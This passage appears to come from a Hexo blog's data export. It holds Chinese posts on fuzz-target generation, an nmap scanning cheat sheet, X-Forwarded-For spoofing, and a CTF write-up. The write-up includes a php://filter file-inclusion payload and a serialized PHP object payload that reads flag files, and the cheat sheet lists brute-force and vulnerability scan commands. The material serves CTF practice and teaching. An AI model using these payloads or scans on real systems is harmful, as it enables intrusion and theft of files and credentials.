Synthesis</h4><p>将splicing阶段重构后的unknown参数具体化,由fuzzer来提供输入.下图为具体化unknown参数的对应类型</p>\n<p><img src=\"https://s2.loli.net/2022/05/01/8TqEMHzG4tv3VRm.png\" alt=\"img_4.png\"></p>\n<p>有很多种方式可以具体化unknown参数</p>\n<p>比如有的API接收的参数类型为string，那么我们可以通过libfuzzer来生成input来feed给这个参数，<br>或者我们可以把string写入到一个文件里，然后把这个文件的路径（string类型）传递给这个参数，这样的话，就相当于可以生成两个target；</p>\n<p>再比如说，我们不借助libfuzzer来给参数提供输入，而是通过定义局部变量的方式，将这个局部变量作为参数传递给API，这样也可以生成一个target；</p>\n<p>再比如说，我们可以用0或者1来代替<code>unknown X</code>，这样也可以生成一个target。</p>\n<p>下图所示代码为替换<code>unknown X</code>后的接口</p>\n<p><img src=\"https://s2.loli.net/2022/05/01/gYPH3m2DFzGhdfs.png\" alt=\"img_5.png\"></p>\n<p>为每个AST生成一个hash,并将这些ASTs的hash生成一个set,通过验证AST的hash来判断某个ast有无重写</p>\n<p><img src=\"https://s2.loli.net/2022/05/01/G5M8oNF2LTVfSW1.png\" alt=\"img_6.png\"></p>\n<p>如上述代码所示，在target合成最后环节，将提取到的ast作为输入，如果ast解析后还有<code>unknown</code>关键字，<br>那么就说明这个ast没有被重写（unknown X具体化），同时会通过ast的hash来记录ast的唯一性。</p>\n<h4 id=\"Target-evaluation\"><a href=\"#Target-evaluation\" class=\"headerlink\" title=\"Target evaluation\"></a>Target evaluation</h4><p>将candicate target提供给libfuzzer并在规定的时间内运行,<br>可以去除掉一些产生误报或无效crash的target.<br>将interesting target保存到临时的repo,评估结果保存到数据库里.</p>\n<p>启发式算法生成target(会生成非常多的target,但还需要我们自己去筛选哪些为valid target),<br>导致生成的target不一定是理想的target,<br>因此我们需要对每个library的API生成的candidate target进行排序和筛选.</p>\n<p>valid target的要求:</p>\n<ul>\n<li><p>the driver fuzzes the right API for the library</p>\n<p>  所谓right API,比如有这样的一个API,它需要提供参数来输入进来,<br>但是无论提供的这个参数值是多少,她都会返回一个固定的值,比如return 4.<br>那么这种API是完全没有被fuzz的必要,因此也无需为这个API生成target.</p>\n<p>  再比如一些函数的参数条件要求比较严格.fuzzer随机生成的输入不太容易满足.<br>这种情况需要用户来手动筛选,是否需要保留这个target.</p>\n</li>\n<li><p>the APIs are used correctly for the purpose of fuzzing</p>\n<p>  筛选策略:根据下面四个signals挑选candidate target</p>\n<ul>\n<li><p>target可以成功构建</p>\n</li>\n<li><p>target自身正常运行</p>\n</li>\n<li><p>为corpus设置最小阈值</p>\n</li>\n<li><p>执行时可覆盖更多的路径</p>\n<p>如果满足上述四个signals，那么就说明这个candidate target是可作为valid target</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>之后就是构建并运行valid targets来获取执行过程中的信息了。</p>\n<p>首先build target and records构建状态和日志；</p>\n<p>运行fuzzer并收集crash,在资源消耗和发现crash之间折中找出理想的运行时间,即规定时间内可以发现更多的crash；</p>\n<p>收集harness如覆盖率信息,以及corpus minimization</p>\n<p>需要注意的是,每个fuzzer都会通过沙箱隔离开来,保证每个fuzzer执行的独立性,可以避免资源占用.<br>比如<code>fuzzer-A</code>在进行写入磁盘操作时,可能会占用整个磁盘.那么通过沙箱隔离就可以为每个fuzzer分配对应的磁盘资源.</p>\n<h4 id=\"前端UI显示\"><a href=\"#前端UI显示\" class=\"headerlink\" title=\"前端UI显示\"></a>前端UI显示</h4><p><img src=\"https://s2.loli.net/2022/05/01/PeapdzGhJ674ofx.png\" alt=\"img_7.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/05/01/9QHiTCXOgIKdsvc.png\" alt=\"img_8.png\"></p>\n<ul>\n<li><p>user packages: 依赖这个包的其他包的数量</p>\n</li>\n<li><p>existing targets: 当前调用这个库的API的target有哪些</p>\n</li>\n<li><p>candidate targets: 这个API所有的候选targets有哪些</p>\n</li>\n</ul>\n<p>两个区别: exitsiting代表当前由用户筛选后的targets;candidating代表生成的所有的targets.(由于没有开源,只是猜测区别是这样的.)</p>\n<ul>\n<li>public apis: 生成target的API有哪些</li>\n</ul>\n<p><img src=\"https://s2.loli.net/2022/05/01/t9og8Ihj5meMY4d.png\" alt=\"img_9.png\"></p>\n<p>默认显示被其他包调用的APIs,重点关注实际使用的API.</p>\n<p>显示API名称和接受的参数类型,点击API名称还可看到具体的函数定义</p>\n<p>三种颜色代表了这个API的三种targets生成状态</p>\n<p>绿色代表这个API当前已经生成了至少一个target</p>\n<p>use sites: 以表格形式展示调用这个API的所有调用者</p>\n<p>未来工作方向:</p>\n<ol>\n<li>由c/c++扩展到其他的语言的target生成</li>\n<li>基于单元测试的动态执行生成target</li>\n<li>通过机器学习方式根据动态执行(覆盖率、语料库大小、crash数量)和静态执行(API名称、库的调用图)收集到的信息来对candidate target进行分类</li>\n</ol>\n"},{"title":"信息收集之nmap","date":"2018-11-18T17:00:00.000Z","_content":"\n\n## 探测主机存活常用方式\n\n* 扫描网段主机：进行ping扫描\n`nmap -sP 192.168.181.50/100`\n* 扫描单个主机\n`nmap 192.168.181.50`\n* 发送tcp的ack包探测主机是否存活\n`nmap 192.168.181.50 -sA`\n* 半开放扫描，不会被目标主机记入系统日志，但须root权限\n`nmap -sS 192.168.181.50`\n* 三次握手tcp扫描, 易被目标主机检测到，但不需root权限\n`nmap -sT 192.168.181.50`\n* 另一目标主机对主机发送数据，获取主机ip\n`nmap -sL 192.168.181.50`\n* 扫描UDP端口\n`nmap -sU 192.168.181.50`\n* 版本检测\n`nmap -sV 192.168.181.50`\n* 操作系统检测\n`namp -O 192.168.181.50`\n* -PN绕过ping命令\n`nmap -O -PN 192.168.181.50`\n* 检测是否存在常见漏洞\n`nmap --script=vuln 192.168.181.50`\n* 在局域网扫描主机特定端口-n加快扫描速度\n`nmap -n -p445 --script=broadast 192.168.181.50`\n\n## nmap脚本使用\n\nnmap脚本扫描时可设置”–script=类别”的方式进行扫描.\n\n* auth:可作为检测部分应用弱口令，也可负责处理鉴权证书（绕开鉴权）的脚本。\n`nmap --script=auth 192.168.181.129`\n* broadcast:局域网内探测服务开启情况，如dhcp/dns/sqlserver等服务.\n`nmap -n -p445 --script=broadcast 192.168.181.129`\n* brute:提供暴力破解，如http/snmap等应用。提供的暴力破解方式可对数据库，smb,snmp等进行简单密码 的暴力猜解\n`nmap --script=brute 192.168.181.129`\n* default:提供基本脚本扫描能力。默认的脚本扫描，主要搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击\n`nmap -sC  192.168.181.50`\n* 检查目标主机是否有常见漏洞\n`nmap --script=vuln 192.168.181.50`\n* external:利用第三方数据库或资源，如：whois解析\n`nmap --script external 192.168.181.129`\n","source":"_posts/信息收集之nmap.md","raw":"---\ntitle: 信息收集之nmap\ndate: 2018-11-19 01:00:00\ntags:\n- 端口扫描\n- 信息收集\n---\n\n\n## 探测主机存活常用方式\n\n* 扫描网段主机：进行ping扫描\n`nmap -sP 192.168.181.50/100`\n* 扫描单个主机\n`nmap 192.168.181.50`\n* 发送tcp的ack包探测主机是否存活\n`nmap 192.168.181.50 -sA`\n* 半开放扫描，不会被目标主机记入系统日志，但须root权限\n`nmap -sS 192.168.181.50`\n* 三次握手tcp扫描, 易被目标主机检测到，但不需root权限\n`nmap -sT 192.168.181.50`\n* 另一目标主机对主机发送数据，获取主机ip\n`nmap -sL 192.168.181.50`\n* 扫描UDP端口\n`nmap -sU 192.168.181.50`\n* 版本检测\n`nmap -sV 192.168.181.50`\n* 操作系统检测\n`namp -O 192.168.181.50`\n* -PN绕过ping命令\n`nmap -O -PN 192.168.181.50`\n* 检测是否存在常见漏洞\n`nmap --script=vuln 192.168.181.50`\n* 在局域网扫描主机特定端口-n加快扫描速度\n`nmap -n -p445 --script=broadast 192.168.181.50`\n\n## nmap脚本使用\n\nnmap脚本扫描时可设置”–script=类别”的方式进行扫描.\n\n* auth:可作为检测部分应用弱口令，也可负责处理鉴权证书（绕开鉴权）的脚本。\n`nmap --script=auth 192.168.181.129`\n* broadcast:局域网内探测服务开启情况，如dhcp/dns/sqlserver等服务.\n`nmap -n -p445 --script=broadcast 192.168.181.129`\n* brute:提供暴力破解，如http/snmap等应用。提供的暴力破解方式可对数据库，smb,snmp等进行简单密码 的暴力猜解\n`nmap --script=brute 192.168.181.129`\n* default:提供基本脚本扫描能力。默认的脚本扫描，主要搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击\n`nmap -sC  192.168.181.50`\n* 检查目标主机是否有常见漏洞\n`nmap --script=vuln 192.168.181.50`\n* external:利用第三方数据库或资源，如：whois解析\n`nmap --script external 192.168.181.129`\n","slug":"信息收集之nmap","published":1,"updated":"2022-04-29T10:22:34.992Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl2n8fso800055l9j1j64h85p","content":"<h2 id=\"探测主机存活常用方式\"><a href=\"#探测主机存活常用方式\" class=\"headerlink\" title=\"探测主机存活常用方式\"></a>探测主机存活常用方式</h2><ul>\n<li>扫描网段主机：进行ping扫描<br><code>nmap -sP 192.168.181.50/100</code></li>\n<li>扫描单个主机<br><code>nmap 192.168.181.50</code></li>\n<li>发送tcp的ack包探测主机是否存活<br><code>nmap 192.168.181.50 -sA</code></li>\n<li>半开放扫描，不会被目标主机记入系统日志，但须root权限<br><code>nmap -sS 192.168.181.50</code></li>\n<li>三次握手tcp扫描, 易被目标主机检测到，但不需root权限<br><code>nmap -sT 192.168.181.50</code></li>\n<li>另一目标主机对主机发送数据，获取主机ip<br><code>nmap -sL 192.168.181.50</code></li>\n<li>扫描UDP端口<br><code>nmap -sU 192.168.181.50</code></li>\n<li>版本检测<br><code>nmap -sV 192.168.181.50</code></li>\n<li>操作系统检测<br><code>namp -O 192.168.181.50</code></li>\n<li>-PN绕过ping命令<br><code>nmap -O -PN 192.168.181.50</code></li>\n<li>检测是否存在常见漏洞<br><code>nmap --script=vuln 192.168.181.50</code></li>\n<li>在局域网扫描主机特定端口-n加快扫描速度<br><code>nmap -n -p445 --script=broadast 192.168.181.50</code></li>\n</ul>\n<h2 id=\"nmap脚本使用\"><a href=\"#nmap脚本使用\" class=\"headerlink\" title=\"nmap脚本使用\"></a>nmap脚本使用</h2><p>nmap脚本扫描时可设置”–script=类别”的方式进行扫描.</p>\n<ul>\n<li>auth:可作为检测部分应用弱口令，也可负责处理鉴权证书（绕开鉴权）的脚本。<br><code>nmap --script=auth 192.168.181.129</code></li>\n<li>broadcast:局域网内探测服务开启情况，如dhcp/dns/sqlserver等服务.<br><code>nmap -n -p445 --script=broadcast 192.168.181.129</code></li>\n<li>brute:提供暴力破解，如http/snmap等应用。提供的暴力破解方式可对数据库，smb,snmp等进行简单密码 的暴力猜解<br><code>nmap --script=brute 192.168.181.129</code></li>\n<li>default:提供基本脚本扫描能力。默认的脚本扫描，主要搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击<br><code>nmap -sC  192.168.181.50</code></li>\n<li>检查目标主机是否有常见漏洞<br><code>nmap --script=vuln 192.168.181.50</code></li>\n<li>external:利用第三方数据库或资源，如：whois解析<br><code>nmap --script external 192.168.181.129</code></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"探测主机存活常用方式\"><a href=\"#探测主机存活常用方式\" class=\"headerlink\" title=\"探测主机存活常用方式\"></a>探测主机存活常用方式</h2><ul>\n<li>扫描网段主机：进行ping扫描<br><code>nmap -sP 192.168.181.50/100</code></li>\n<li>扫描单个主机<br><code>nmap 192.168.181.50</code></li>\n<li>发送tcp的ack包探测主机是否存活<br><code>nmap 192.168.181.50 -sA</code></li>\n<li>半开放扫描，不会被目标主机记入系统日志，但须root权限<br><code>nmap -sS 192.168.181.50</code></li>\n<li>三次握手tcp扫描, 易被目标主机检测到，但不需root权限<br><code>nmap -sT 192.168.181.50</code></li>\n<li>另一目标主机对主机发送数据，获取主机ip<br><code>nmap -sL 192.168.181.50</code></li>\n<li>扫描UDP端口<br><code>nmap -sU 192.168.181.50</code></li>\n<li>版本检测<br><code>nmap -sV 192.168.181.50</code></li>\n<li>操作系统检测<br><code>namp -O 192.168.181.50</code></li>\n<li>-PN绕过ping命令<br><code>nmap -O -PN 192.168.181.50</code></li>\n<li>检测是否存在常见漏洞<br><code>nmap --script=vuln 192.168.181.50</code></li>\n<li>在局域网扫描主机特定端口-n加快扫描速度<br><code>nmap -n -p445 --script=broadast 192.168.181.50</code></li>\n</ul>\n<h2 id=\"nmap脚本使用\"><a href=\"#nmap脚本使用\" class=\"headerlink\" title=\"nmap脚本使用\"></a>nmap脚本使用</h2><p>nmap脚本扫描时可设置”–script=类别”的方式进行扫描.</p>\n<ul>\n<li>auth:可作为检测部分应用弱口令，也可负责处理鉴权证书（绕开鉴权）的脚本。<br><code>nmap --script=auth 192.168.181.129</code></li>\n<li>broadcast:局域网内探测服务开启情况，如dhcp/dns/sqlserver等服务.<br><code>nmap -n -p445 --script=broadcast 192.168.181.129</code></li>\n<li>brute:提供暴力破解，如http/snmap等应用。提供的暴力破解方式可对数据库，smb,snmp等进行简单密码 的暴力猜解<br><code>nmap --script=brute 192.168.181.129</code></li>\n<li>default:提供基本脚本扫描能力。默认的脚本扫描，主要搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击<br><code>nmap -sC  192.168.181.50</code></li>\n<li>检查目标主机是否有常见漏洞<br><code>nmap --script=vuln 192.168.181.50</code></li>\n<li>external:利用第三方数据库或资源，如：whois解析<br><code>nmap --script external 192.168.181.129</code></li>\n</ul>\n"},{"title":"反向代理服务器-HTTP请求头中的XFF","date":"2018-11-19T19:00:00.000Z","_content":"\n## 在做最基础的有关于XFF头的ctf-web题时对xff原理的简单记录\n\nXFF原理性认知\n\n### 一、反向代理说明\n\n反向代理即：通过代理服务器接收来自外部网络的请求，然后代理服务器再转发给内网服务器，再将内部服务器得到的结果通过代理服务器返回给外部网络的客户端。\n\n### 二、反向代理功能\n\n利用反向代理可以提供WAF功能，阻止web攻击；而在大型网站中通常将反向代理作为公网访问地址，位于防火墙外部，Web服务器是内网。如果内网服务器返回错误消息，代理服务器会先行截取该消息并更改标头中列出的任何 URL，然后再将消息发送给客户机。如此可防止外部客户机获取内部内容服务器的重定向 URL。\n\n### 三、HTTP请求中源IP\n\n从HTTP请求中获得请求者的IP地址有两种方式：Remote Address和X-Forward-For。但是两者的安全性不通：\n\nRemote Address为HTTP请求的源地址，HTTP协议三次握手与发送响应报文时都使用的此地址，因此一旦请求者伪造Remote Address地址，他将无法收到HTTP响应报文，此时伪造没有任何意义。这也就使得Remote Address默认具有防篡改的功能。\n\n而在一些大型网站中，外部网络的用户的HTTP请求会经过反向代理服务器转发给内网服务器，内网服务器这时候收到的Remote Address地址并不是外部网络用户地址，而是反向代理服务器的IP。因此，对于内网服务器来说，无法查看用户IP，所以这时，HTTP扩展头部X-Forward-For（XFF）起到了作用。当反向代理服务器转发外部网络用户的HTTP请求时，需要将用户的真实IP地址写入到X-Forward-For中，以便后端服务能够使用。由于X-Forward-For是可修改的，所以X-Forward-For中的地址在某种程度上不可信。\n\n因此，在进行与安全有关的操作时，只能通过Remote Address获取用户的IP地址，不能相信任何请求头。\n\nCC代理属于正向代理：\n\n![305504-20161112120952686-765920985.png](https://i.loli.net/2021/08/11/zxyRWtw58VBsjk6.png)","source":"_posts/反向代理服务器-HTTP请求头中的XFF.md","raw":"---\ntitle: 反向代理服务器-HTTP请求头中的XFF\ndate: 2018-11-20 03:00:00\ntags:\n- 反向代理\n- XFF\n---\n\n## 在做最基础的有关于XFF头的ctf-web题时对xff原理的简单记录\n\nXFF原理性认知\n\n### 一、反向代理说明\n\n反向代理即：通过代理服务器接收来自外部网络的请求，然后代理服务器再转发给内网服务器，再将内部服务器得到的结果通过代理服务器返回给外部网络的客户端。\n\n### 二、反向代理功能\n\n利用反向代理可以提供WAF功能，阻止web攻击；而在大型网站中通常将反向代理作为公网访问地址，位于防火墙外部，Web服务器是内网。如果内网服务器返回错误消息，代理服务器会先行截取该消息并更改标头中列出的任何 URL，然后再将消息发送给客户机。如此可防止外部客户机获取内部内容服务器的重定向 URL。\n\n### 三、HTTP请求中源IP\n\n从HTTP请求中获得请求者的IP地址有两种方式：Remote Address和X-Forward-For。但是两者的安全性不通：\n\nRemote Address为HTTP请求的源地址，HTTP协议三次握手与发送响应报文时都使用的此地址，因此一旦请求者伪造Remote Address地址，他将无法收到HTTP响应报文，此时伪造没有任何意义。这也就使得Remote Address默认具有防篡改的功能。\n\n而在一些大型网站中，外部网络的用户的HTTP请求会经过反向代理服务器转发给内网服务器，内网服务器这时候收到的Remote Address地址并不是外部网络用户地址，而是反向代理服务器的IP。因此，对于内网服务器来说，无法查看用户IP，所以这时，HTTP扩展头部X-Forward-For（XFF）起到了作用。当反向代理服务器转发外部网络用户的HTTP请求时，需要将用户的真实IP地址写入到X-Forward-For中，以便后端服务能够使用。由于X-Forward-For是可修改的，所以X-Forward-For中的地址在某种程度上不可信。\n\n因此，在进行与安全有关的操作时，只能通过Remote Address获取用户的IP地址，不能相信任何请求头。\n\nCC代理属于正向代理：\n\n![305504-20161112120952686-765920985.png](https://i.loli.net/2021/08/11/zxyRWtw58VBsjk6.png)","slug":"反向代理服务器-HTTP请求头中的XFF","published":1,"updated":"2022-04-29T10:22:34.993Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl2n8fso800075l9jbdke6nj7","content":"<h2 id=\"在做最基础的有关于XFF头的ctf-web题时对xff原理的简单记录\"><a href=\"#在做最基础的有关于XFF头的ctf-web题时对xff原理的简单记录\" class=\"headerlink\" title=\"在做最基础的有关于XFF头的ctf-web题时对xff原理的简单记录\"></a>在做最基础的有关于XFF头的ctf-web题时对xff原理的简单记录</h2><p>XFF原理性认知</p>\n<h3 id=\"一、反向代理说明\"><a href=\"#一、反向代理说明\" class=\"headerlink\" title=\"一、反向代理说明\"></a>一、反向代理说明</h3><p>反向代理即：通过代理服务器接收来自外部网络的请求，然后代理服务器再转发给内网服务器，再将内部服务器得到的结果通过代理服务器返回给外部网络的客户端。</p>\n<h3 id=\"二、反向代理功能\"><a href=\"#二、反向代理功能\" class=\"headerlink\" title=\"二、反向代理功能\"></a>二、反向代理功能</h3><p>利用反向代理可以提供WAF功能，阻止web攻击；而在大型网站中通常将反向代理作为公网访问地址，位于防火墙外部，Web服务器是内网。如果内网服务器返回错误消息，代理服务器会先行截取该消息并更改标头中列出的任何 URL，然后再将消息发送给客户机。如此可防止外部客户机获取内部内容服务器的重定向 URL。</p>\n<h3 id=\"三、HTTP请求中源IP\"><a href=\"#三、HTTP请求中源IP\" class=\"headerlink\" title=\"三、HTTP请求中源IP\"></a>三、HTTP请求中源IP</h3><p>从HTTP请求中获得请求者的IP地址有两种方式：Remote Address和X-Forward-For。但是两者的安全性不通：</p>\n<p>Remote Address为HTTP请求的源地址，HTTP协议三次握手与发送响应报文时都使用的此地址，因此一旦请求者伪造Remote Address地址，他将无法收到HTTP响应报文，此时伪造没有任何意义。这也就使得Remote Address默认具有防篡改的功能。</p>\n<p>而在一些大型网站中，外部网络的用户的HTTP请求会经过反向代理服务器转发给内网服务器，内网服务器这时候收到的Remote Address地址并不是外部网络用户地址，而是反向代理服务器的IP。因此，对于内网服务器来说，无法查看用户IP，所以这时，HTTP扩展头部X-Forward-For（XFF）起到了作用。当反向代理服务器转发外部网络用户的HTTP请求时，需要将用户的真实IP地址写入到X-Forward-For中，以便后端服务能够使用。由于X-Forward-For是可修改的，所以X-Forward-For中的地址在某种程度上不可信。</p>\n<p>因此，在进行与安全有关的操作时，只能通过Remote Address获取用户的IP地址，不能相信任何请求头。</p>\n<p>CC代理属于正向代理：</p>\n<p><img src=\"https://i.loli.net/2021/08/11/zxyRWtw58VBsjk6.png\" alt=\"305504-20161112120952686-765920985.png\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"在做最基础的有关于XFF头的ctf-web题时对xff原理的简单记录\"><a href=\"#在做最基础的有关于XFF头的ctf-web题时对xff原理的简单记录\" class=\"headerlink\" title=\"在做最基础的有关于XFF头的ctf-web题时对xff原理的简单记录\"></a>在做最基础的有关于XFF头的ctf-web题时对xff原理的简单记录</h2><p>XFF原理性认知</p>\n<h3 id=\"一、反向代理说明\"><a href=\"#一、反向代理说明\" class=\"headerlink\" title=\"一、反向代理说明\"></a>一、反向代理说明</h3><p>反向代理即：通过代理服务器接收来自外部网络的请求，然后代理服务器再转发给内网服务器，再将内部服务器得到的结果通过代理服务器返回给外部网络的客户端。</p>\n<h3 id=\"二、反向代理功能\"><a href=\"#二、反向代理功能\" class=\"headerlink\" title=\"二、反向代理功能\"></a>二、反向代理功能</h3><p>利用反向代理可以提供WAF功能，阻止web攻击；而在大型网站中通常将反向代理作为公网访问地址，位于防火墙外部，Web服务器是内网。如果内网服务器返回错误消息，代理服务器会先行截取该消息并更改标头中列出的任何 URL，然后再将消息发送给客户机。如此可防止外部客户机获取内部内容服务器的重定向 URL。</p>\n<h3 id=\"三、HTTP请求中源IP\"><a href=\"#三、HTTP请求中源IP\" class=\"headerlink\" title=\"三、HTTP请求中源IP\"></a>三、HTTP请求中源IP</h3><p>从HTTP请求中获得请求者的IP地址有两种方式：Remote Address和X-Forward-For。但是两者的安全性不通：</p>\n<p>Remote Address为HTTP请求的源地址，HTTP协议三次握手与发送响应报文时都使用的此地址，因此一旦请求者伪造Remote Address地址，他将无法收到HTTP响应报文，此时伪造没有任何意义。这也就使得Remote Address默认具有防篡改的功能。</p>\n<p>而在一些大型网站中，外部网络的用户的HTTP请求会经过反向代理服务器转发给内网服务器，内网服务器这时候收到的Remote Address地址并不是外部网络用户地址，而是反向代理服务器的IP。因此，对于内网服务器来说，无法查看用户IP，所以这时，HTTP扩展头部X-Forward-For（XFF）起到了作用。当反向代理服务器转发外部网络用户的HTTP请求时，需要将用户的真实IP地址写入到X-Forward-For中，以便后端服务能够使用。由于X-Forward-For是可修改的，所以X-Forward-For中的地址在某种程度上不可信。</p>\n<p>因此，在进行与安全有关的操作时，只能通过Remote Address获取用户的IP地址，不能相信任何请求头。</p>\n<p>CC代理属于正向代理：</p>\n<p><img src=\"https://i.loli.net/2021/08/11/zxyRWtw58VBsjk6.png\" alt=\"305504-20161112120952686-765920985.png\"></p>\n"},{"title":"记一道集PHP伪协议及PHP反序列化综合运用的CTF","date":"2018-11-18T18:00:00.000Z","_content":"\n首先拿到题目后，毫无疑问，查看一下源码\n\n``` php\n<!--  \n$user = $_GET[\"txt\"];  \n$file = $_GET[\"file\"];  \n$pass = $_GET[\"password\"];    \nif(isset($user)&&(file_get_contents($user,'r')===\"welcome to the bugkuctf\")){  \necho \"hello admin!<br>\";  \ninclude($file); //hint.php  \n}else{  \necho \"you are not admin ! \";  \n}  \n-->\n```\n\n解读一下源码的意思：\n\n1. get方式传入三个参数：txt，file，password\n2. file_get_contents()函数的作用是将$user的内容读取出来，在此即为将user读取出来的内容数值与类型完全等于 `welcome to the bugkuctf`（三个等于号）\n3. 如果满足if条件，则打印输出”hello admin!”。并且将包含的hint.php内容显示出来\n\n------\n\n在此，可以运用两个PHP的伪协议\n\n* php://filter 可以进行任意文件的读取。\n\n[有关php://filter的详细了解](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)\n\n* php://input 可以读取没有处理过的post数据\n\n通过对以上代码的分析，我们有了解决思路：\n\n* 对于file_get_contents($user,’r’)===”welcome to the bugkuctf”，我们可以借用php伪协议php://input，要想使user中的字符串读取出来与三等号后的内容一致，就必须使他的传入参数txt，来post welcome to the bugkuctf\n\n* 再来看include($file); //hint.php 我们可以用php://filter来进行hint.php的base编码，从而可以读取出hint.php的base编码，从而可以读取出hint.php的内容。**\n\n构造payload:\n\n```\nindex.php?txt=php://input&file=php://filter/read=convert.base64-encode/resource=hint.php\n```\n\n利用bp改包\n\n![1.png](https://i.loli.net/2021/08/11/8Fpr2NfGheadXyj.png)\n\n得到回显\n\n![2.png](https://i.loli.net/2021/08/11/oVi7pbluDk8LMqR.png)\n\n发现一组base64,再进行base64解码，发现又有一组代码\n\n```php\n#hint.php\n\n<?php  \n\nclass Flag{//flag.php  \npublic $file;  \npublic function __tostring(){  \n    if(isset($this->file)){  \n        echo file_get_contents($this->file); \n        echo \"<br>\";\n    return (\"good\");\n    }  \n}  \n}  \n?>\n```\n\n再来分析这段代码\n\n看到flag.php，猜测flag或许就从这段代码中找出。发现了比较关键的一个函数**tostring(),此函数的作用是将Flag类作为字符串执行时会自动执行此函数，并且将变量$file作为文件名输出文件内容。但是，这个时候发现并没有代码显示可以调用这个类，如果没有调用这个类，也就无法执行**tostring()函数。而且，还有一个password参数没有用上，所以考虑，或许还会存在另一段代码。那就接着上一步，把hint.php换成index.php会有什么发现呢？\n\n果不其然，确实又有了重大发现：\n\n![3.png](https://i.loli.net/2021/08/11/k41uCXsiTl3ja2o.png)\n\n再次得到回显\n\n![4.png](https://i.loli.net/2021/08/11/9fxMITFDy8WkvRl.png)\n\n解码后\n\n```php\nindex.php\n\n<?php  \n$txt = $_GET[\"txt\"];  \n$file = $_GET[\"file\"];  \n$password = $_GET[\"password\"];  \n\nif(isset($txt)&&(file_get_contents($txt,'r')===\"welcome to the bugkuctf\")){  \necho \"hello friend!<br>\";  \nif(preg_match(\"/flag/\",$file)){ \n    echo \"ä¸è½ç°å¨å°±ç»ä½ flagå¦\";\n    exit();  \n}else{  \n    include($file);   \n    $password = unserialize($password);  \n    echo $password;  \n}  \n}else{  \necho \"you are not the number of bugku ! \";  \n}  \n\n?>  \n\n<!--  \n$user = $_GET[\"txt\"];  \n$file = $_GET[\"file\"];  \n$pass = $_GET[\"password\"];  \n\nif(isset($user)&&(file_get_contents($user,'r')===\"welcome to the bugkuctf\")){  \necho \"hello admin!<br>\";  \ninclude($file); //hint.php  \n}else{  \necho \"you are not admin ! \";  \n}  \n -->\n```\n\n结果发现了正则匹配函数preg_match(“/flag/“,$file)，对flag进行了正则匹配。\n\n再来接着看，else代码块中又一次包含了$file,并且对$password进行反序列化。通过对上述hint.php的解读，我们就可以构造password，password为Flag类型，字符串变量file=flag.php。构造的序列化对象payload，password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}\n\n![5.png](https://i.loli.net/2021/08/11/HCewWuc58MpJohf.png)\n\n在这里简单说一下php的反序列化\n\n将原来的某个对象进行序列化之后，从序列化后的结果中就可以知道这个对象的具体类型和值\n\n在这里简单说一下序列化后的几个字母的意思，以password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}为例\n\n* O（大写）：对象class\n* 4：4个字符\n* “Flag”：对象名\n* 1：数量，一个\n* s：string\n* {}里的为参数\n\n反序列化可以理解为序列化的的逆运算\n","source":"_posts/记一道集PHP伪协议PHP反序列化综合运用的CTF.md","raw":"---\ntitle: \"记一道集PHP伪协议及PHP反序列化综合运用的CTF\"\ndate: 2018-11-19 02:00:00\ntags:\n- PHP伪协议\n- 反序列化\n---\n\n首先拿到题目后，毫无疑问，查看一下源码\n\n``` php\n<!--  \n$user = $_GET[\"txt\"];  \n$file = $_GET[\"file\"];  \n$pass = $_GET[\"password\"];    \nif(isset($user)&&(file_get_contents($user,'r')===\"welcome to the bugkuctf\")){  \necho \"hello admin!<br>\";  \ninclude($file); //hint.php  \n}else{  \necho \"you are not admin ! \";  \n}  \n-->\n```\n\n解读一下源码的意思：\n\n1. get方式传入三个参数：txt，file，password\n2. file_get_contents()函数的作用是将$user的内容读取出来，在此即为将user读取出来的内容数值与类型完全等于 `welcome to the bugkuctf`（三个等于号）\n3. 如果满足if条件，则打印输出”hello admin!”。并且将包含的hint.php内容显示出来\n\n------\n\n在此，可以运用两个PHP的伪协议\n\n* php://filter 可以进行任意文件的读取。\n\n[有关php://filter的详细了解](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)\n\n* php://input 可以读取没有处理过的post数据\n\n通过对以上代码的分析，我们有了解决思路：\n\n* 对于file_get_contents($user,’r’)===”welcome to the bugkuctf”，我们可以借用php伪协议php://input，要想使user中的字符串读取出来与三等号后的内容一致，就必须使他的传入参数txt，来post welcome to the bugkuctf\n\n* 再来看include($file); //hint.php 我们可以用php://filter来进行hint.php的base编码，从而可以读取出hint.php的base编码，从而可以读取出hint.php的内容。**\n\n构造payload:\n\n```\nindex.php?txt=php://input&file=php://filter/read=convert.base64-encode/resource=hint.php\n```\n\n利用bp改包\n\n![1.png](https://i.loli.net/2021/08/11/8Fpr2NfGheadXyj.png)\n\n得到回显\n\n![2.png](https://i.loli.net/2021/08/11/oVi7pbluDk8LMqR.png)\n\n发现一组base64,再进行base64解码，发现又有一组代码\n\n```php\n#hint.php\n\n<?php  \n\nclass Flag{//flag.php  \npublic $file;  \npublic function __tostring(){  \n    if(isset($this->file)){  \n        echo file_get_contents($this->file); \n        echo \"<br>\";\n    return (\"good\");\n    }  \n}  \n}  \n?>\n```\n\n再来分析这段代码\n\n看到flag.php，猜测flag或许就从这段代码中找出。发现了比较关键的一个函数**tostring(),此函数的作用是将Flag类作为字符串执行时会自动执行此函数，并且将变量$file作为文件名输出文件内容。但是，这个时候发现并没有代码显示可以调用这个类，如果没有调用这个类，也就无法执行**tostring()函数。而且，还有一个password参数没有用上，所以考虑，或许还会存在另一段代码。那就接着上一步，把hint.php换成index.php会有什么发现呢？\n\n果不其然，确实又有了重大发现：\n\n![3.png](https://i.loli.net/2021/08/11/k41uCXsiTl3ja2o.png)\n\n再次得到回显\n\n![4.png](https://i.loli.net/2021/08/11/9fxMITFDy8WkvRl.png)\n\n解码后\n\n```php\nindex.php\n\n<?php  \n$txt = $_GET[\"txt\"];  \n$file = $_GET[\"file\"];  \n$password = $_GET[\"password\"];  \n\nif(isset($txt)&&(file_get_contents($txt,'r')===\"welcome to the bugkuctf\")){  \necho 